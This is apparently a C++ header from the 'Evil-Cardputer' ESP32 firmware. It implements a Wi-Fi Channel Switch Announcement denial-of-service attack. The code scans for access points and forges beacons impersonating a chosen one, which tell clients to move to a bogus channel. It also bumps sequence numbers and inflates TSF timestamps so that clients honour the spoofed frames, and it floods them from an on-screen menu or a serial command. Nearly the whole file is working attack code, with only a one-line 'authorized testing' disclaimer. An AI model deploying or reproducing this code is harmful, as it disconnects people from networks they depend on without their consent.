#pragma once
// ============================================================================
//  CSA (Channel Switch Announcement) attack for Evil-Cardputer
// ----------------------------------------------------------------------------
//  Spoofs a target AP's beacon carrying an 802.11 Channel Switch Announcement
//  information element (ID 37), telling associated clients to move to a bogus
//  channel. Clients that honour CSA leave the real channel and drop their link.
//  A disruption/denial-of-service management-frame attack, same family as the
//  deauther already in this firmware. Authorized testing only.
//
//  Relies on the ieee80211_raw_frame_sanity_check bypass already defined in the
//  main sketch, and on esp_wifi_80211_tx (WIFI_IF_STA).
// ============================================================================

namespace csa {

// Build a spoofed beacon for `bssid`/`ssid` on `realch` carrying a CSA IE that
// points clients at `newch`. Returns the frame length written into `buf`.
static int build_csa_beacon(uint8_t* buf, const uint8_t* bssid, const char* ssid, uint8_t realch, uint8_t newch) {
    int n = 0;
    buf[n++] = 0x80; buf[n++] = 0x00;                 // FC: beacon
    buf[n++] = 0x00; buf[n++] = 0x00;                 // duration
    for (int i = 0; i < 6; i++) buf[n++] = 0xFF;      // DA broadcast
    memcpy(buf + n, bssid, 6); n += 6;                // SA
    memcpy(buf + n, bssid, 6); n += 6;                // BSSID
    buf[n++] = 0x00; buf[n++] = 0x00;                 // seq
    for (int i = 0; i < 8; i++) buf[n++] = 0x00;      // timestamp
    buf[n++] = 0x64; buf[n++] = 0x00;                 // beacon interval
    buf[n++] = 0x01; buf[n++] = 0x04;                 // capabilities (ESS, privacy)
    uint8_t sl = (uint8_t)strlen(ssid); if (sl > 32) sl = 32;
    buf[n++] = 0x00; buf[n++] = sl; memcpy(buf + n, ssid, sl); n += sl;      // SSID
    buf[n++] = 0x01; buf[n++] = 0x08;                 // Supported rates
    buf[n++] = 0x82; buf[n++] = 0x84; buf[n++] = 0x8b; buf[n++] = 0x96;
    buf[n++] = 0x24; buf[n++] = 0x30; buf[n++] = 0x48; buf[n++] = 0x6c;
    buf[n++] = 0x03; buf[n++] = 0x01; buf[n++] = realch;                      // DS param (current ch)
    buf[n++] = 0x25; buf[n++] = 0x03; buf[n++] = 0x01; buf[n++] = newch; buf[n++] = 0x01;  // CSA: mode=1, new ch, count=1
    return n;
}

// Refresh a built beacon before each TX: bump the 802.11 sequence number (so the
// client doesn't dedup our frames) and advance the TSF timestamp to a large,
// increasing value (so our beacon looks NEWER than the real AP's and the CSA is
// honoured instead of discarded as stale).
static void csa_stamp(uint8_t* buf) {
    static uint16_t seq = 0;
    static uint64_t tsf = 0x0000010000000000ULL;      // start high to beat the real AP's uptime TSF
    uint16_t sc = (uint16_t)((seq++ & 0x0FFF) << 4);  // seq ctrl: frag=0, seq in bits 4..15
    buf[22] = sc & 0xFF; buf[23] = (sc >> 8) & 0xFF;
    tsf += 0x19000;                                   // ~102400 us (one beacon interval)
    for (int i = 0; i < 8; i++) buf[24 + i] = (uint8_t)(tsf >> (8 * i));
}

static void draw(const char* ssid, uint8_t realch, uint8_t newch, uint32_t sent, bool running) {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841);
    M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
    M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841);
    M5.Display.setCursor(6, 0); M5.Display.println("CSA Attack");
    M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.setCursor(6, 24); M5.Display.printf("%.18s", ssid);
    M5.Display.setTextColor(0x5AEB, TFT_BLACK);
    M5.Display.setCursor(6, 48); M5.Display.printf("ch %d -> %d", realch, newch);
    M5.Display.setTextColor(running ? TFT_RED : menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor(6, 72); M5.Display.println(running ? "[ ATTACKING ]" : "[ stopped ]");
    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
    M5.Display.setCursor(6, 92); M5.Display.printf("beacons: %lu", (unsigned long)sent);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setTextSize(1); M5.Display.setCursor(6, 122); M5.Display.println("ENTER start/stop  BACK exit");
    M5.Display.display();
}

static void attack(const uint8_t* bssid, const char* ssid, uint8_t realch) {
    uint8_t newch = (realch <= 6) ? (uint8_t)(realch + 5) : (uint8_t)(realch - 5);
    uint8_t frame[128];
    int flen = build_csa_beacon(frame, bssid, ssid, realch, newch);
    WiFi.mode(WIFI_STA); WiFi.disconnect();
    esp_wifi_set_channel(realch, WIFI_SECOND_CHAN_NONE);
    bool running = false; uint32_t sent = 0, lastDraw = 0;
    draw(ssid, realch, newch, 0, false); enterDebounce();
    while (true) {
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        if (kp(KEY_ENTER)) { keyRelease(); running = !running; draw(ssid, realch, newch, sent, running); }
        if (running) {
            for (int b = 0; b < 8; b++) {
                csa_stamp(frame);                       // fresh seq + newer TSF so clients don't dedup/ignore it
                esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false); sent++;
            }
            if (millis() - lastDraw > 300) { lastDraw = millis(); draw(ssid, realch, newch, sent, running); }
            delay(5);
        } else delay(15);
    }
}

// ---- AP picker (own scan) --------------------------------------------------
inline void menu() {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.setCursor(6, 40); M5.Display.println("Scanning APs...");
    M5.Display.display();
    int nap = WiFi.scanNetworks(false, true);
    if (nap <= 0) {
        M5.Display.fillScreen(TFT_BLACK); M5.Display.setCursor(6, 40); M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK);
        M5.Display.println("No AP found"); M5.Display.display();
        enterDebounce(); while (true) { M5.update(); cardUpdate(); if (kp(KEY_ENTER) || kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(12); }
        WiFi.scanDelete(); return;
    }
    int sel = 0, top = 0; const int rowH = 17, headerY = 18, vis = 6; bool rd = true; enterDebounce();
    while (true) {
        if (rd) {
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841); M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
            M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841); M5.Display.setCursor(6, 0); M5.Display.println("CSA: pick AP");
            for (int i = 0; i < vis && top + i < nap; i++) {
                int idx = top + i; int y = headerY + i * rowH;
                if (idx == sel) { M5.Display.fillRect(0, y, M5.Display.width(), rowH, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor); }
                else M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                M5.Display.setCursor(6, y + 1); M5.Display.printf("%.16s c%d", WiFi.SSID(idx).c_str(), WiFi.channel(idx));
            }
            M5.Display.display(); rd = false;
        }
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); WiFi.scanDelete(); return; }
        if (kp(KEY_ENTER)) { keyRelease(); break; }
        if (kp(';')) { keyRelease(); if (sel > 0) sel--; if (sel < top) top = sel; rd = true; delay(90); }
        if (kp('.')) { keyRelease(); if (sel < nap - 1) sel++; if (sel >= top + vis) top = sel - vis + 1; rd = true; delay(90); }
        delay(10);
    }
    uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(sel), 6);
    String ssid = WiFi.SSID(sel); uint8_t ch = (uint8_t)WiFi.channel(sel);
    WiFi.scanDelete();
    attack(bssid, ssid.c_str(), ch);
}

inline void console(String a) {
    a.trim();
    // csa <bssid aa:bb:..> <channel> [ssid]
    if (a == "" || a == "help") { Serial.println(F("csa <bssid> <ch> [ssid]  (spoofed CSA beacon; BACK/serial to stop not supported, runs ~5s)")); return; }
    int sp = a.indexOf(' '); if (sp < 0) { Serial.println(F("usage: csa <bssid> <ch> [ssid]")); return; }
    String bs = a.substring(0, sp); String rest = a.substring(sp + 1); rest.trim();
    int sp2 = rest.indexOf(' '); String chs = sp2 < 0 ? rest : rest.substring(0, sp2);
    String ssid = sp2 < 0 ? String("test") : rest.substring(sp2 + 1);
    uint8_t bssid[6]; int b[6];
    if (sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6) { Serial.println(F("bad bssid")); return; }
    for (int i = 0; i < 6; i++) bssid[i] = (uint8_t)b[i];
    uint8_t ch = (uint8_t)chs.toInt(); if (!ch) ch = 1;
    uint8_t newch = (ch <= 6) ? (uint8_t)(ch + 5) : (uint8_t)(ch - 5);
    uint8_t frame[128]; int flen = build_csa_beacon(frame, bssid, ssid.c_str(), ch, newch);
    WiFi.mode(WIFI_STA); WiFi.disconnect(); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    uint32_t t0 = millis(), sent = 0;
    while (millis() - t0 < 5000) { for (int k = 0; k < 8; k++) { csa_stamp(frame); esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false); sent++; } delay(5); }
    Serial.printf("csa: %lu beacons ch%d->%d on %s\n", (unsigned long)sent, ch, newch, ssid.c_str());
}

} // namespace csa
